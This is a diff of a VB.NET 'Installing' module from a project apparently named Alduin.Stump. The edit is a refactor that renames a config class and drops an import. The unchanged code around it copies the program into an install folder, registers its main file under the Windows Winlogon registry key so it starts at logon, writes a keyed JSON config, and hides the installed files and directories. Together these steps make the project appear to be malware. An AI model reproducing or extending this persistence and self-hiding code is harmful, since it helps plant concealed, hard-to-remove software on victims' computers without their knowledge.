@@ -1,7 +1,6 @@
 ﻿Imports System.IO
 Imports System.Text
 Imports Alduin.Stump.Alduin.Stump.Models
-Imports Alduin.Stump.Alduin.Stump.Moduls.IO
 Imports Newtonsoft.Json
 
 Module Installing
@@ -18,14 +17,14 @@ Module Installing
             Copy_filesExept(installPath, ExeptFiles)
             Copy_directories(installPath)
             StartupRegistryModule.Set_registry("Software\Microsoft\Windows NT\CurrentVersion\Winlogon\", installPath & "\" & GetMainFile())
-            Dim config As New Config With {
+            Dim config As New ConfigModel With {
                 .KeyUnique = RandomString(10, 10),
                 .KeyCertified = SavedKeyCertified,
                 .MainFileName = Re_Named_Main_file,
                 .MainPath = installPath
             }
             Dim jsonString As String = JsonConvert.SerializeObject(config)
-            IOModule.Write_file(GetPathes.Get_JsonFilewithPath(), jsonString)
+            IOModule.Write_file(Get_JsonFilewithPath(), jsonString)
             HidderModule.Hide_files(installPath)
             HidderModule.Hide_directories(installPath)
         End If
